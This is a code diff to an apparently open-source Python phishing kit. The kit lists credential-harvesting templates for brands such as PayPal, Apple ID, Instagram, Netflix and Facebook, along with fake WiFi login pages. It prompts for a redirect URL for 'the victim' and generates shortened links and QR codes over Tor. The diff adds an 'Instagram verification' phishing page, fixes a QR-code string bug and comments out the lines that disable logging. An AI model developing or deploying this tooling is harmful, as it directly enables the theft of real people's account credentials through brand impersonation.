@@ -13,9 +13,9 @@ from src import requests
 from src.torpy.http.requests import TorRequests
 from src.flask import Flask, render_template, request
 import logging
-log = logging.getLogger('werkzeug')
-log.disabled = True
-environ['WERKZEUG_RUN_MAIN'] = 'true'
+#log = logging.getLogger('werkzeug')
+#log.disabled = True
+#environ['WERKZEUG_RUN_MAIN'] = 'true'
 
 try:
     subprocess.check_output('php -v > /dev/null 2>&1',shell=True)
@@ -130,7 +130,7 @@ def attack(server,url,wifi,custom,qr):
                             ur = shortened if '\n' not in shortened else shortened.split('\n')[-1]
                             qrc = '[*] QR Code for '+ur+' saved at '+qrcode(ur,server,sess)
                         else:
-                            qrc = '[*] QR Code for ']=link+' saved at '+qrcode(link,server,sess)                    
+                            qrc = '[*] QR Code for '+link+' saved at '+qrcode(link,server,sess)                    
                     break
                 except Exception as e:
                     print(e)
@@ -232,8 +232,8 @@ def main():
 
 [1] ADOBE           [11] INSTAGRAM     [21] TWITCH           [31] FLICKR   
 [2] AMAZON          [12] LINKEDIN      [22] TWITTER          [32] COINIMP
-[3] APPLE ID        [13] MESSENGER     [23] WORDPRESS        [q/Q] QUIT
-[4] WIFI            [14] MICROSOFT     [24] YAHOO        
+[3] APPLE ID        [13] MESSENGER     [23] WORDPRESS        [33] INSTAGRAM VERIFICATION
+[4] WIFI            [14] MICROSOFT     [24] YAHOO            [q/Q] QUIT
 [5] DROPBOX         [15] NETFLIX       [25] EBAY         
 [6] FACEBOOK        [16] PAYPAL        [26] ORIGIN
 [7] GITHUB          [17] PINTEREST     [27] CRYPTOCOIN
@@ -275,7 +275,8 @@ def main():
         29 : 'ngrok',
         30 : 'reddit',
         31 : 'flickr',
-        32 : 'coinimp'
+        32 : 'coinimp',
+        33 : 'instagram-verified'
     }
     links = {
         'apple' : 'https://www.apple.com/shop/bag',
@@ -320,14 +321,14 @@ def main():
             break
         else:
             print(colored('[*] Invalid choice','yellow',attrs=['bold']))    
-    if server.upper() != 'WIFI':
+    if server.upper() not in 'WIFI INSTAGRAM-VERIFIED':
         r = colored('[*] Enter the URL you want to redirect the victim to (default is homepage of '+server.upper()+') : ','green',attrs=['bold'])    
         print()
         redir_url = input(r)
         if not redir_url:
             redir_url = links[server]
         wifi_model = ''
-    else:
+    elif server.upper() == 'WIFI':
         sub_servers = {
             1 : 'firmware-upgrade',
             2 : 'starbucks-login',
@@ -356,6 +357,8 @@ def main():
             wifi_model1 = input(colored('[*] Enter the AP name of the target router ','green',attrs=['bold']))
             wifi_model2 = input(colored('[*] Enter the encryption type of the target router ','green',attrs=['bold']))
             wifi_model = wifi_model1.upper()+':'+wifi_model2.upper()        
+    else:
+        wifi_model = redir_url = ''
     print()
     custom = input(colored('[*] Enter a custom shortened URL name (leave empty to generate a random shortened URL) ','green',attrs=['bold']))
     print()
